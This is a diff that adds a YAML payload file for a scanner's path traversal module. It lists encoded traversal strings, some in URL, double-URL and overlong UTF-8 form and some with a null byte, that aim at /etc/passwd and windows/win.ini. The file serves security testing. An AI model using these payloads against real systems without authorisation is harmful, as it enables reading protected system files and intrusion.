@@ -1,0 +1,24 @@
+# Path Traversal payloads.
+# Simple list of traversal strings — any that produce a system file signature = confirmed.
+# Module: scanner/modules/path_traversal.py
+
+payloads:
+  # Unix/Linux
+  - "../../../../etc/passwd"
+  - "../../../../etc/passwd%00"
+  - "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+  - "....//....//....//....//etc/passwd"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "%252e%252e%252fetc%252fpasswd"
+  - "..%252f..%252fetc%252fpasswd"
+  - "/%2F..%2F..%2F..%2Fetc%2Fpasswd"
+  - "/../../../../../../etc/passwd"
+  - "....%2f....%2f....%2fetc%2fpasswd"
+  - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  # Windows
+  - "../../../../windows/win.ini"
+  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
+  - "..%255c..%255c..%255cwindows%255cwin.ini"
+  - "..\\..\\..\\windows\\win.ini"
+  - "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
